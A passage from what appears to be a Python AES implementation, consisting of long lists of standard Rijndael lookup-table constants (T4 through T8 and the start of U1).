        0xA6F157A6,
        0xB4C773B4,
        0xC65197C6,
        0xE823CBE8,
        0xDD7CA1DD,
        0x749CE874,
        0x1F213E1F,
        0x4BDD964B,
        0xBDDC61BD,
        0x8B860D8B,
        0x8A850F8A,
        0x7090E070,
        0x3E427C3E,
        0xB5C471B5,
        0x66AACC66,
        0x48D89048,
        0x03050603,
        0xF601F7F6,
        0x0E121C0E,
        0x61A3C261,
        0x355F6A35,
        0x57F9AE57,
        0xB9D069B9,
        0x86911786,
        0xC15899C1,
        0x1D273A1D,
        0x9EB9279E,
        0xE138D9E1,
        0xF813EBF8,
        0x98B32B98,
        0x11332211,
        0x69BBD269,
        0xD970A9D9,
        0x8E89078E,
        0x94A73394,
        0x9BB62D9B,
        0x1E223C1E,
        0x87921587,
        0xE920C9E9,
        0xCE4987CE,
        0x55FFAA55,
        0x28785028,
        0xDF7AA5DF,
        0x8C8F038C,
        0xA1F859A1,
        0x89800989,
        0x0D171A0D,
        0xBFDA65BF,
        0xE631D7E6,
        0x42C68442,
        0x68B8D068,
        0x41C38241,
        0x99B02999,
        0x2D775A2D,
        0x0F111E0F,
        0xB0CB7BB0,
        0x54FCA854,
        0xBBD66DBB,
        0x163A2C16,
    ]
    T4 = [
        0x6363A5C6,
        0x7C7C84F8,
        0x777799EE,
        0x7B7B8DF6,
        0xF2F20DFF,
        0x6B6BBDD6,
        0x6F6FB1DE,
        0xC5C55491,
        0x30305060,
        0x01010302,
        0x6767A9CE,
        0x2B2B7D56,
        0xFEFE19E7,
        0xD7D762B5,
        0xABABE64D,
        0x76769AEC,
        0xCACA458F,
        0x82829D1F,
        0xC9C94089,
        0x7D7D87FA,
        0xFAFA15EF,
        0x5959EBB2,
        0x4747C98E,
        0xF0F00BFB,
        0xADADEC41,
        0xD4D467B3,
        0xA2A2FD5F,
        0xAFAFEA45,
        0x9C9CBF23,
        0xA4A4F753,
        0x727296E4,
        0xC0C05B9B,
        0xB7B7C275,
        0xFDFD1CE1,
        0x9393AE3D,
        0x26266A4C,
        0x36365A6C,
        0x3F3F417E,
        0xF7F702F5,
        0xCCCC4F83,
        0x34345C68,
        0xA5A5F451,
        0xE5E534D1,
        0xF1F108F9,
        0x717193E2,
        0xD8D873AB,
        0x31315362,
        0x15153F2A,
        0x04040C08,
        0xC7C75295,
        0x23236546,
        0xC3C35E9D,
        0x18182830,
        0x9696A137,
        0x05050F0A,
        0x9A9AB52F,
        0x0707090E,
        0x12123624,
        0x80809B1B,
        0xE2E23DDF,
        0xEBEB26CD,
        0x2727694E,
        0xB2B2CD7F,
        0x75759FEA,
        0x09091B12,
        0x83839E1D,
        0x2C2C7458,
        0x1A1A2E34,
        0x1B1B2D36,
        0x6E6EB2DC,
        0x5A5AEEB4,
        0xA0A0FB5B,
        0x5252F6A4,
        0x3B3B4D76,
        0xD6D661B7,
        0xB3B3CE7D,
        0x29297B52,
        0xE3E33EDD,
        0x2F2F715E,
        0x84849713,
        0x5353F5A6,
        0xD1D168B9,
        0x00000000,
        0xEDED2CC1,
        0x20206040,
        0xFCFC1FE3,
        0xB1B1C879,
        0x5B5BEDB6,
        0x6A6ABED4,
        0xCBCB468D,
        0xBEBED967,
        0x39394B72,
        0x4A4ADE94,
        0x4C4CD498,
        0x5858E8B0,
        0xCFCF4A85,
        0xD0D06BBB,
        0xEFEF2AC5,
        0xAAAAE54F,
        0xFBFB16ED,
        0x4343C586,
        0x4D4DD79A,
        0x33335566,
        0x85859411,
        0x4545CF8A,
        0xF9F910E9,
        0x02020604,
        0x7F7F81FE,
        0x5050F0A0,
        0x3C3C4478,
        0x9F9FBA25,
        0xA8A8E34B,
        0x5151F3A2,
        0xA3A3FE5D,
        0x4040C080,
        0x8F8F8A05,
        0x9292AD3F,
        0x9D9DBC21,
        0x38384870,
        0xF5F504F1,
        0xBCBCDF63,
        0xB6B6C177,
        0xDADA75AF,
        0x21216342,
        0x10103020,
        0xFFFF1AE5,
        0xF3F30EFD,
        0xD2D26DBF,
        0xCDCD4C81,
        0x0C0C1418,
        0x13133526,
        0xECEC2FC3,
        0x5F5FE1BE,
        0x9797A235,
        0x4444CC88,
        0x1717392E,
        0xC4C45793,
        0xA7A7F255,
        0x7E7E82FC,
        0x3D3D477A,
        0x6464ACC8,
        0x5D5DE7BA,
        0x19192B32,
        0x737395E6,
        0x6060A0C0,
        0x81819819,
        0x4F4FD19E,
        0xDCDC7FA3,
        0x22226644,
        0x2A2A7E54,
        0x9090AB3B,
        0x8888830B,
        0x4646CA8C,
        0xEEEE29C7,
        0xB8B8D36B,
        0x14143C28,
        0xDEDE79A7,
        0x5E5EE2BC,
        0x0B0B1D16,
        0xDBDB76AD,
        0xE0E03BDB,
        0x32325664,
        0x3A3A4E74,
        0x0A0A1E14,
        0x4949DB92,
        0x06060A0C,
        0x24246C48,
        0x5C5CE4B8,
        0xC2C25D9F,
        0xD3D36EBD,
        0xACACEF43,
        0x6262A6C4,
        0x9191A839,
        0x9595A431,
        0xE4E437D3,
        0x79798BF2,
        0xE7E732D5,
        0xC8C8438B,
        0x3737596E,
        0x6D6DB7DA,
        0x8D8D8C01,
        0xD5D564B1,
        0x4E4ED29C,
        0xA9A9E049,
        0x6C6CB4D8,
        0x5656FAAC,
        0xF4F407F3,
        0xEAEA25CF,
        0x6565AFCA,
        0x7A7A8EF4,
        0xAEAEE947,
        0x08081810,
        0xBABAD56F,
        0x787888F0,
        0x25256F4A,
        0x2E2E725C,
        0x1C1C2438,
        0xA6A6F157,
        0xB4B4C773,
        0xC6C65197,
        0xE8E823CB,
        0xDDDD7CA1,
        0x74749CE8,
        0x1F1F213E,
        0x4B4BDD96,
        0xBDBDDC61,
        0x8B8B860D,
        0x8A8A850F,
        0x707090E0,
        0x3E3E427C,
        0xB5B5C471,
        0x6666AACC,
        0x4848D890,
        0x03030506,
        0xF6F601F7,
        0x0E0E121C,
        0x6161A3C2,
        0x35355F6A,
        0x5757F9AE,
        0xB9B9D069,
        0x86869117,
        0xC1C15899,
        0x1D1D273A,
        0x9E9EB927,
        0xE1E138D9,
        0xF8F813EB,
        0x9898B32B,
        0x11113322,
        0x6969BBD2,
        0xD9D970A9,
        0x8E8E8907,
        0x9494A733,
        0x9B9BB62D,
        0x1E1E223C,
        0x87879215,
        0xE9E920C9,
        0xCECE4987,
        0x5555FFAA,
        0x28287850,
        0xDFDF7AA5,
        0x8C8C8F03,
        0xA1A1F859,
        0x89898009,
        0x0D0D171A,
        0xBFBFDA65,
        0xE6E631D7,
        0x4242C684,
        0x6868B8D0,
        0x4141C382,
        0x9999B029,
        0x2D2D775A,
        0x0F0F111E,
        0xB0B0CB7B,
        0x5454FCA8,
        0xBBBBD66D,
        0x16163A2C,
    ]
    T5 = [
        0x51F4A750,
        0x7E416553,
        0x1A17A4C3,
        0x3A275E96,
        0x3BAB6BCB,
        0x1F9D45F1,
        0xACFA58AB,
        0x4BE30393,
        0x2030FA55,
        0xAD766DF6,
        0x88CC7691,
        0xF5024C25,
        0x4FE5D7FC,
        0xC52ACBD7,
        0x26354480,
        0xB562A38F,
        0xDEB15A49,
        0x25BA1B67,
        0x45EA0E98,
        0x5DFEC0E1,
        0xC32F7502,
        0x814CF012,
        0x8D4697A3,
        0x6BD3F9C6,
        0x038F5FE7,
        0x15929C95,
        0xBF6D7AEB,
        0x955259DA,
        0xD4BE832D,
        0x587421D3,
        0x49E06929,
        0x8EC9C844,
        0x75C2896A,
        0xF48E7978,
        0x99583E6B,
        0x27B971DD,
        0xBEE14FB6,
        0xF088AD17,
        0xC920AC66,
        0x7DCE3AB4,
        0x63DF4A18,
        0xE51A3182,
        0x97513360,
        0x62537F45,
        0xB16477E0,
        0xBB6BAE84,
        0xFE81A01C,
        0xF9082B94,
        0x70486858,
        0x8F45FD19,
        0x94DE6C87,
        0x527BF8B7,
        0xAB73D323,
        0x724B02E2,
        0xE31F8F57,
        0x6655AB2A,
        0xB2EB2807,
        0x2FB5C203,
        0x86C57B9A,
        0xD33708A5,
        0x302887F2,
        0x23BFA5B2,
        0x02036ABA,
        0xED16825C,
        0x8ACF1C2B,
        0xA779B492,
        0xF307F2F0,
        0x4E69E2A1,
        0x65DAF4CD,
        0x0605BED5,
        0xD134621F,
        0xC4A6FE8A,
        0x342E539D,
        0xA2F355A0,
        0x058AE132,
        0xA4F6EB75,
        0x0B83EC39,
        0x4060EFAA,
        0x5E719F06,
        0xBD6E1051,
        0x3E218AF9,
        0x96DD063D,
        0xDD3E05AE,
        0x4DE6BD46,
        0x91548DB5,
        0x71C45D05,
        0x0406D46F,
        0x605015FF,
        0x1998FB24,
        0xD6BDE997,
        0x894043CC,
        0x67D99E77,
        0xB0E842BD,
        0x07898B88,
        0xE7195B38,
        0x79C8EEDB,
        0xA17C0A47,
        0x7C420FE9,
        0xF8841EC9,
        0x00000000,
        0x09808683,
        0x322BED48,
        0x1E1170AC,
        0x6C5A724E,
        0xFD0EFFFB,
        0x0F853856,
        0x3DAED51E,
        0x362D3927,
        0x0A0FD964,
        0x685CA621,
        0x9B5B54D1,
        0x24362E3A,
        0x0C0A67B1,
        0x9357E70F,
        0xB4EE96D2,
        0x1B9B919E,
        0x80C0C54F,
        0x61DC20A2,
        0x5A774B69,
        0x1C121A16,
        0xE293BA0A,
        0xC0A02AE5,
        0x3C22E043,
        0x121B171D,
        0x0E090D0B,
        0xF28BC7AD,
        0x2DB6A8B9,
        0x141EA9C8,
        0x57F11985,
        0xAF75074C,
        0xEE99DDBB,
        0xA37F60FD,
        0xF701269F,
        0x5C72F5BC,
        0x44663BC5,
        0x5BFB7E34,
        0x8B432976,
        0xCB23C6DC,
        0xB6EDFC68,
        0xB8E4F163,
        0xD731DCCA,
        0x42638510,
        0x13972240,
        0x84C61120,
        0x854A247D,
        0xD2BB3DF8,
        0xAEF93211,
        0xC729A16D,
        0x1D9E2F4B,
        0xDCB230F3,
        0x0D8652EC,
        0x77C1E3D0,
        0x2BB3166C,
        0xA970B999,
        0x119448FA,
        0x47E96422,
        0xA8FC8CC4,
        0xA0F03F1A,
        0x567D2CD8,
        0x223390EF,
        0x87494EC7,
        0xD938D1C1,
        0x8CCAA2FE,
        0x98D40B36,
        0xA6F581CF,
        0xA57ADE28,
        0xDAB78E26,
        0x3FADBFA4,
        0x2C3A9DE4,
        0x5078920D,
        0x6A5FCC9B,
        0x547E4662,
        0xF68D13C2,
        0x90D8B8E8,
        0x2E39F75E,
        0x82C3AFF5,
        0x9F5D80BE,
        0x69D0937C,
        0x6FD52DA9,
        0xCF2512B3,
        0xC8AC993B,
        0x10187DA7,
        0xE89C636E,
        0xDB3BBB7B,
        0xCD267809,
        0x6E5918F4,
        0xEC9AB701,
        0x834F9AA8,
        0xE6956E65,
        0xAAFFE67E,
        0x21BCCF08,
        0xEF15E8E6,
        0xBAE79BD9,
        0x4A6F36CE,
        0xEA9F09D4,
        0x29B07CD6,
        0x31A4B2AF,
        0x2A3F2331,
        0xC6A59430,
        0x35A266C0,
        0x744EBC37,
        0xFC82CAA6,
        0xE090D0B0,
        0x33A7D815,
        0xF104984A,
        0x41ECDAF7,
        0x7FCD500E,
        0x1791F62F,
        0x764DD68D,
        0x43EFB04D,
        0xCCAA4D54,
        0xE49604DF,
        0x9ED1B5E3,
        0x4C6A881B,
        0xC12C1FB8,
        0x4665517F,
        0x9D5EEA04,
        0x018C355D,
        0xFA877473,
        0xFB0B412E,
        0xB3671D5A,
        0x92DBD252,
        0xE9105633,
        0x6DD64713,
        0x9AD7618C,
        0x37A10C7A,
        0x59F8148E,
        0xEB133C89,
        0xCEA927EE,
        0xB761C935,
        0xE11CE5ED,
        0x7A47B13C,
        0x9CD2DF59,
        0x55F2733F,
        0x1814CE79,
        0x73C737BF,
        0x53F7CDEA,
        0x5FFDAA5B,
        0xDF3D6F14,
        0x7844DB86,
        0xCAAFF381,
        0xB968C43E,
        0x3824342C,
        0xC2A3405F,
        0x161DC372,
        0xBCE2250C,
        0x283C498B,
        0xFF0D9541,
        0x39A80171,
        0x080CB3DE,
        0xD8B4E49C,
        0x6456C190,
        0x7BCB8461,
        0xD532B670,
        0x486C5C74,
        0xD0B85742,
    ]
    T6 = [
        0x5051F4A7,
        0x537E4165,
        0xC31A17A4,
        0x963A275E,
        0xCB3BAB6B,
        0xF11F9D45,
        0xABACFA58,
        0x934BE303,
        0x552030FA,
        0xF6AD766D,
        0x9188CC76,
        0x25F5024C,
        0xFC4FE5D7,
        0xD7C52ACB,
        0x80263544,
        0x8FB562A3,
        0x49DEB15A,
        0x6725BA1B,
        0x9845EA0E,
        0xE15DFEC0,
        0x02C32F75,
        0x12814CF0,
        0xA38D4697,
        0xC66BD3F9,
        0xE7038F5F,
        0x9515929C,
        0xEBBF6D7A,
        0xDA955259,
        0x2DD4BE83,
        0xD3587421,
        0x2949E069,
        0x448EC9C8,
        0x6A75C289,
        0x78F48E79,
        0x6B99583E,
        0xDD27B971,
        0xB6BEE14F,
        0x17F088AD,
        0x66C920AC,
        0xB47DCE3A,
        0x1863DF4A,
        0x82E51A31,
        0x60975133,
        0x4562537F,
        0xE0B16477,
        0x84BB6BAE,
        0x1CFE81A0,
        0x94F9082B,
        0x58704868,
        0x198F45FD,
        0x8794DE6C,
        0xB7527BF8,
        0x23AB73D3,
        0xE2724B02,
        0x57E31F8F,
        0x2A6655AB,
        0x07B2EB28,
        0x032FB5C2,
        0x9A86C57B,
        0xA5D33708,
        0xF2302887,
        0xB223BFA5,
        0xBA02036A,
        0x5CED1682,
        0x2B8ACF1C,
        0x92A779B4,
        0xF0F307F2,
        0xA14E69E2,
        0xCD65DAF4,
        0xD50605BE,
        0x1FD13462,
        0x8AC4A6FE,
        0x9D342E53,
        0xA0A2F355,
        0x32058AE1,
        0x75A4F6EB,
        0x390B83EC,
        0xAA4060EF,
        0x065E719F,
        0x51BD6E10,
        0xF93E218A,
        0x3D96DD06,
        0xAEDD3E05,
        0x464DE6BD,
        0xB591548D,
        0x0571C45D,
        0x6F0406D4,
        0xFF605015,
        0x241998FB,
        0x97D6BDE9,
        0xCC894043,
        0x7767D99E,
        0xBDB0E842,
        0x8807898B,
        0x38E7195B,
        0xDB79C8EE,
        0x47A17C0A,
        0xE97C420F,
        0xC9F8841E,
        0x00000000,
        0x83098086,
        0x48322BED,
        0xAC1E1170,
        0x4E6C5A72,
        0xFBFD0EFF,
        0x560F8538,
        0x1E3DAED5,
        0x27362D39,
        0x640A0FD9,
        0x21685CA6,
        0xD19B5B54,
        0x3A24362E,
        0xB10C0A67,
        0x0F9357E7,
        0xD2B4EE96,
        0x9E1B9B91,
        0x4F80C0C5,
        0xA261DC20,
        0x695A774B,
        0x161C121A,
        0x0AE293BA,
        0xE5C0A02A,
        0x433C22E0,
        0x1D121B17,
        0x0B0E090D,
        0xADF28BC7,
        0xB92DB6A8,
        0xC8141EA9,
        0x8557F119,
        0x4CAF7507,
        0xBBEE99DD,
        0xFDA37F60,
        0x9FF70126,
        0xBC5C72F5,
        0xC544663B,
        0x345BFB7E,
        0x768B4329,
        0xDCCB23C6,
        0x68B6EDFC,
        0x63B8E4F1,
        0xCAD731DC,
        0x10426385,
        0x40139722,
        0x2084C611,
        0x7D854A24,
        0xF8D2BB3D,
        0x11AEF932,
        0x6DC729A1,
        0x4B1D9E2F,
        0xF3DCB230,
        0xEC0D8652,
        0xD077C1E3,
        0x6C2BB316,
        0x99A970B9,
        0xFA119448,
        0x2247E964,
        0xC4A8FC8C,
        0x1AA0F03F,
        0xD8567D2C,
        0xEF223390,
        0xC787494E,
        0xC1D938D1,
        0xFE8CCAA2,
        0x3698D40B,
        0xCFA6F581,
        0x28A57ADE,
        0x26DAB78E,
        0xA43FADBF,
        0xE42C3A9D,
        0x0D507892,
        0x9B6A5FCC,
        0x62547E46,
        0xC2F68D13,
        0xE890D8B8,
        0x5E2E39F7,
        0xF582C3AF,
        0xBE9F5D80,
        0x7C69D093,
        0xA96FD52D,
        0xB3CF2512,
        0x3BC8AC99,
        0xA710187D,
        0x6EE89C63,
        0x7BDB3BBB,
        0x09CD2678,
        0xF46E5918,
        0x01EC9AB7,
        0xA8834F9A,
        0x65E6956E,
        0x7EAAFFE6,
        0x0821BCCF,
        0xE6EF15E8,
        0xD9BAE79B,
        0xCE4A6F36,
        0xD4EA9F09,
        0xD629B07C,
        0xAF31A4B2,
        0x312A3F23,
        0x30C6A594,
        0xC035A266,
        0x37744EBC,
        0xA6FC82CA,
        0xB0E090D0,
        0x1533A7D8,
        0x4AF10498,
        0xF741ECDA,
        0x0E7FCD50,
        0x2F1791F6,
        0x8D764DD6,
        0x4D43EFB0,
        0x54CCAA4D,
        0xDFE49604,
        0xE39ED1B5,
        0x1B4C6A88,
        0xB8C12C1F,
        0x7F466551,
        0x049D5EEA,
        0x5D018C35,
        0x73FA8774,
        0x2EFB0B41,
        0x5AB3671D,
        0x5292DBD2,
        0x33E91056,
        0x136DD647,
        0x8C9AD761,
        0x7A37A10C,
        0x8E59F814,
        0x89EB133C,
        0xEECEA927,
        0x35B761C9,
        0xEDE11CE5,
        0x3C7A47B1,
        0x599CD2DF,
        0x3F55F273,
        0x791814CE,
        0xBF73C737,
        0xEA53F7CD,
        0x5B5FFDAA,
        0x14DF3D6F,
        0x867844DB,
        0x81CAAFF3,
        0x3EB968C4,
        0x2C382434,
        0x5FC2A340,
        0x72161DC3,
        0x0CBCE225,
        0x8B283C49,
        0x41FF0D95,
        0x7139A801,
        0xDE080CB3,
        0x9CD8B4E4,
        0x906456C1,
        0x617BCB84,
        0x70D532B6,
        0x74486C5C,
        0x42D0B857,
    ]
    T7 = [
        0xA75051F4,
        0x65537E41,
        0xA4C31A17,
        0x5E963A27,
        0x6BCB3BAB,
        0x45F11F9D,
        0x58ABACFA,
        0x03934BE3,
        0xFA552030,
        0x6DF6AD76,
        0x769188CC,
        0x4C25F502,
        0xD7FC4FE5,
        0xCBD7C52A,
        0x44802635,
        0xA38FB562,
        0x5A49DEB1,
        0x1B6725BA,
        0x0E9845EA,
        0xC0E15DFE,
        0x7502C32F,
        0xF012814C,
        0x97A38D46,
        0xF9C66BD3,
        0x5FE7038F,
        0x9C951592,
        0x7AEBBF6D,
        0x59DA9552,
        0x832DD4BE,
        0x21D35874,
        0x692949E0,
        0xC8448EC9,
        0x896A75C2,
        0x7978F48E,
        0x3E6B9958,
        0x71DD27B9,
        0x4FB6BEE1,
        0xAD17F088,
        0xAC66C920,
        0x3AB47DCE,
        0x4A1863DF,
        0x3182E51A,
        0x33609751,
        0x7F456253,
        0x77E0B164,
        0xAE84BB6B,
        0xA01CFE81,
        0x2B94F908,
        0x68587048,
        0xFD198F45,
        0x6C8794DE,
        0xF8B7527B,
        0xD323AB73,
        0x02E2724B,
        0x8F57E31F,
        0xAB2A6655,
        0x2807B2EB,
        0xC2032FB5,
        0x7B9A86C5,
        0x08A5D337,
        0x87F23028,
        0xA5B223BF,
        0x6ABA0203,
        0x825CED16,
        0x1C2B8ACF,
        0xB492A779,
        0xF2F0F307,
        0xE2A14E69,
        0xF4CD65DA,
        0xBED50605,
        0x621FD134,
        0xFE8AC4A6,
        0x539D342E,
        0x55A0A2F3,
        0xE132058A,
        0xEB75A4F6,
        0xEC390B83,
        0xEFAA4060,
        0x9F065E71,
        0x1051BD6E,
        0x8AF93E21,
        0x063D96DD,
        0x05AEDD3E,
        0xBD464DE6,
        0x8DB59154,
        0x5D0571C4,
        0xD46F0406,
        0x15FF6050,
        0xFB241998,
        0xE997D6BD,
        0x43CC8940,
        0x9E7767D9,
        0x42BDB0E8,
        0x8B880789,
        0x5B38E719,
        0xEEDB79C8,
        0x0A47A17C,
        0x0FE97C42,
        0x1EC9F884,
        0x00000000,
        0x86830980,
        0xED48322B,
        0x70AC1E11,
        0x724E6C5A,
        0xFFFBFD0E,
        0x38560F85,
        0xD51E3DAE,
        0x3927362D,
        0xD9640A0F,
        0xA621685C,
        0x54D19B5B,
        0x2E3A2436,
        0x67B10C0A,
        0xE70F9357,
        0x96D2B4EE,
        0x919E1B9B,
        0xC54F80C0,
        0x20A261DC,
        0x4B695A77,
        0x1A161C12,
        0xBA0AE293,
        0x2AE5C0A0,
        0xE0433C22,
        0x171D121B,
        0x0D0B0E09,
        0xC7ADF28B,
        0xA8B92DB6,
        0xA9C8141E,
        0x198557F1,
        0x074CAF75,
        0xDDBBEE99,
        0x60FDA37F,
        0x269FF701,
        0xF5BC5C72,
        0x3BC54466,
        0x7E345BFB,
        0x29768B43,
        0xC6DCCB23,
        0xFC68B6ED,
        0xF163B8E4,
        0xDCCAD731,
        0x85104263,
        0x22401397,
        0x112084C6,
        0x247D854A,
        0x3DF8D2BB,
        0x3211AEF9,
        0xA16DC729,
        0x2F4B1D9E,
        0x30F3DCB2,
        0x52EC0D86,
        0xE3D077C1,
        0x166C2BB3,
        0xB999A970,
        0x48FA1194,
        0x642247E9,
        0x8CC4A8FC,
        0x3F1AA0F0,
        0x2CD8567D,
        0x90EF2233,
        0x4EC78749,
        0xD1C1D938,
        0xA2FE8CCA,
        0x0B3698D4,
        0x81CFA6F5,
        0xDE28A57A,
        0x8E26DAB7,
        0xBFA43FAD,
        0x9DE42C3A,
        0x920D5078,
        0xCC9B6A5F,
        0x4662547E,
        0x13C2F68D,
        0xB8E890D8,
        0xF75E2E39,
        0xAFF582C3,
        0x80BE9F5D,
        0x937C69D0,
        0x2DA96FD5,
        0x12B3CF25,
        0x993BC8AC,
        0x7DA71018,
        0x636EE89C,
        0xBB7BDB3B,
        0x7809CD26,
        0x18F46E59,
        0xB701EC9A,
        0x9AA8834F,
        0x6E65E695,
        0xE67EAAFF,
        0xCF0821BC,
        0xE8E6EF15,
        0x9BD9BAE7,
        0x36CE4A6F,
        0x09D4EA9F,
        0x7CD629B0,
        0xB2AF31A4,
        0x23312A3F,
        0x9430C6A5,
        0x66C035A2,
        0xBC37744E,
        0xCAA6FC82,
        0xD0B0E090,
        0xD81533A7,
        0x984AF104,
        0xDAF741EC,
        0x500E7FCD,
        0xF62F1791,
        0xD68D764D,
        0xB04D43EF,
        0x4D54CCAA,
        0x04DFE496,
        0xB5E39ED1,
        0x881B4C6A,
        0x1FB8C12C,
        0x517F4665,
        0xEA049D5E,
        0x355D018C,
        0x7473FA87,
        0x412EFB0B,
        0x1D5AB367,
        0xD25292DB,
        0x5633E910,
        0x47136DD6,
        0x618C9AD7,
        0x0C7A37A1,
        0x148E59F8,
        0x3C89EB13,
        0x27EECEA9,
        0xC935B761,
        0xE5EDE11C,
        0xB13C7A47,
        0xDF599CD2,
        0x733F55F2,
        0xCE791814,
        0x37BF73C7,
        0xCDEA53F7,
        0xAA5B5FFD,
        0x6F14DF3D,
        0xDB867844,
        0xF381CAAF,
        0xC43EB968,
        0x342C3824,
        0x405FC2A3,
        0xC372161D,
        0x250CBCE2,
        0x498B283C,
        0x9541FF0D,
        0x017139A8,
        0xB3DE080C,
        0xE49CD8B4,
        0xC1906456,
        0x84617BCB,
        0xB670D532,
        0x5C74486C,
        0x5742D0B8,
    ]
    T8 = [
        0xF4A75051,
        0x4165537E,
        0x17A4C31A,
        0x275E963A,
        0xAB6BCB3B,
        0x9D45F11F,
        0xFA58ABAC,
        0xE303934B,
        0x30FA5520,
        0x766DF6AD,
        0xCC769188,
        0x024C25F5,
        0xE5D7FC4F,
        0x2ACBD7C5,
        0x35448026,
        0x62A38FB5,
        0xB15A49DE,
        0xBA1B6725,
        0xEA0E9845,
        0xFEC0E15D,
        0x2F7502C3,
        0x4CF01281,
        0x4697A38D,
        0xD3F9C66B,
        0x8F5FE703,
        0x929C9515,
        0x6D7AEBBF,
        0x5259DA95,
        0xBE832DD4,
        0x7421D358,
        0xE0692949,
        0xC9C8448E,
        0xC2896A75,
        0x8E7978F4,
        0x583E6B99,
        0xB971DD27,
        0xE14FB6BE,
        0x88AD17F0,
        0x20AC66C9,
        0xCE3AB47D,
        0xDF4A1863,
        0x1A3182E5,
        0x51336097,
        0x537F4562,
        0x6477E0B1,
        0x6BAE84BB,
        0x81A01CFE,
        0x082B94F9,
        0x48685870,
        0x45FD198F,
        0xDE6C8794,
        0x7BF8B752,
        0x73D323AB,
        0x4B02E272,
        0x1F8F57E3,
        0x55AB2A66,
        0xEB2807B2,
        0xB5C2032F,
        0xC57B9A86,
        0x3708A5D3,
        0x2887F230,
        0xBFA5B223,
        0x036ABA02,
        0x16825CED,
        0xCF1C2B8A,
        0x79B492A7,
        0x07F2F0F3,
        0x69E2A14E,
        0xDAF4CD65,
        0x05BED506,
        0x34621FD1,
        0xA6FE8AC4,
        0x2E539D34,
        0xF355A0A2,
        0x8AE13205,
        0xF6EB75A4,
        0x83EC390B,
        0x60EFAA40,
        0x719F065E,
        0x6E1051BD,
        0x218AF93E,
        0xDD063D96,
        0x3E05AEDD,
        0xE6BD464D,
        0x548DB591,
        0xC45D0571,
        0x06D46F04,
        0x5015FF60,
        0x98FB2419,
        0xBDE997D6,
        0x4043CC89,
        0xD99E7767,
        0xE842BDB0,
        0x898B8807,
        0x195B38E7,
        0xC8EEDB79,
        0x7C0A47A1,
        0x420FE97C,
        0x841EC9F8,
        0x00000000,
        0x80868309,
        0x2BED4832,
        0x1170AC1E,
        0x5A724E6C,
        0x0EFFFBFD,
        0x8538560F,
        0xAED51E3D,
        0x2D392736,
        0x0FD9640A,
        0x5CA62168,
        0x5B54D19B,
        0x362E3A24,
        0x0A67B10C,
        0x57E70F93,
        0xEE96D2B4,
        0x9B919E1B,
        0xC0C54F80,
        0xDC20A261,
        0x774B695A,
        0x121A161C,
        0x93BA0AE2,
        0xA02AE5C0,
        0x22E0433C,
        0x1B171D12,
        0x090D0B0E,
        0x8BC7ADF2,
        0xB6A8B92D,
        0x1EA9C814,
        0xF1198557,
        0x75074CAF,
        0x99DDBBEE,
        0x7F60FDA3,
        0x01269FF7,
        0x72F5BC5C,
        0x663BC544,
        0xFB7E345B,
        0x4329768B,
        0x23C6DCCB,
        0xEDFC68B6,
        0xE4F163B8,
        0x31DCCAD7,
        0x63851042,
        0x97224013,
        0xC6112084,
        0x4A247D85,
        0xBB3DF8D2,
        0xF93211AE,
        0x29A16DC7,
        0x9E2F4B1D,
        0xB230F3DC,
        0x8652EC0D,
        0xC1E3D077,
        0xB3166C2B,
        0x70B999A9,
        0x9448FA11,
        0xE9642247,
        0xFC8CC4A8,
        0xF03F1AA0,
        0x7D2CD856,
        0x3390EF22,
        0x494EC787,
        0x38D1C1D9,
        0xCAA2FE8C,
        0xD40B3698,
        0xF581CFA6,
        0x7ADE28A5,
        0xB78E26DA,
        0xADBFA43F,
        0x3A9DE42C,
        0x78920D50,
        0x5FCC9B6A,
        0x7E466254,
        0x8D13C2F6,
        0xD8B8E890,
        0x39F75E2E,
        0xC3AFF582,
        0x5D80BE9F,
        0xD0937C69,
        0xD52DA96F,
        0x2512B3CF,
        0xAC993BC8,
        0x187DA710,
        0x9C636EE8,
        0x3BBB7BDB,
        0x267809CD,
        0x5918F46E,
        0x9AB701EC,
        0x4F9AA883,
        0x956E65E6,
        0xFFE67EAA,
        0xBCCF0821,
        0x15E8E6EF,
        0xE79BD9BA,
        0x6F36CE4A,
        0x9F09D4EA,
        0xB07CD629,
        0xA4B2AF31,
        0x3F23312A,
        0xA59430C6,
        0xA266C035,
        0x4EBC3774,
        0x82CAA6FC,
        0x90D0B0E0,
        0xA7D81533,
        0x04984AF1,
        0xECDAF741,
        0xCD500E7F,
        0x91F62F17,
        0x4DD68D76,
        0xEFB04D43,
        0xAA4D54CC,
        0x9604DFE4,
        0xD1B5E39E,
        0x6A881B4C,
        0x2C1FB8C1,
        0x65517F46,
        0x5EEA049D,
        0x8C355D01,
        0x877473FA,
        0x0B412EFB,
        0x671D5AB3,
        0xDBD25292,
        0x105633E9,
        0xD647136D,
        0xD7618C9A,
        0xA10C7A37,
        0xF8148E59,
        0x133C89EB,
        0xA927EECE,
        0x61C935B7,
        0x1CE5EDE1,
        0x47B13C7A,
        0xD2DF599C,
        0xF2733F55,
        0x14CE7918,
        0xC737BF73,
        0xF7CDEA53,
        0xFDAA5B5F,
        0x3D6F14DF,
        0x44DB8678,
        0xAFF381CA,
        0x68C43EB9,
        0x24342C38,
        0xA3405FC2,
        0x1DC37216,
        0xE2250CBC,
        0x3C498B28,
        0x0D9541FF,
        0xA8017139,
        0x0CB3DE08,
        0xB4E49CD8,
        0x56C19064,
        0xCB84617B,
        0x32B670D5,
        0x6C5C7448,
        0xB85742D0,
    ]
    U1 = [
        0x00000000,
        0x0E090D0B,
        0x1C121A16,
        0x121B171D,
        0x3824342C,
        0x362D3927,
        0x24362E3A,
        0x2A3F2331,
        0x70486858,
        0x7E416553,
        0x6C5A724E,
        0x62537F45,
        0x486C5C74,
        0x4665517F,
        0x547E4662,
        0x5A774B69,
        0xE090D0B0,
        0xEE99DDBB,
        0xFC82CAA6,
        0xF28BC7AD,
        0xD8B4E49C,
        0xD6BDE997,
        0xC4A6FE8A,
        0xCAAFF381,
        0x90D8B8E8,
        0x9ED1B5E3,
        0x8CCAA2FE,
        0x82C3AFF5,
        0xA8FC8CC4,
        0xA6F581CF,
        0xB4EE96D2,
        0xBAE79BD9,
        0xDB3BBB7B,
        0xD532B670,
        0xC729A16D,
        0xC920AC66,
        0xE31F8F57,
        0xED16825C,
        0xFF0D9541,
        0xF104984A,
        0xAB73D323,
        0xA57ADE28,
        0xB761C935,
        0xB968C43E,
        0x9357E70F,
        0x9D5EEA04,
        0x8F45FD19,
        0x814CF012,
        0x3BAB6BCB,
        0x35A266C0,
        0x27B971DD,
        0x29B07CD6,
        0x038F5FE7,
        0x0D8652EC,
        0x1F9D45F1,
        0x119448FA,
        0x4BE30393,
        0x45EA0E98,
        0x57F11985,
        0x59F8148E,
        0x73C737BF,
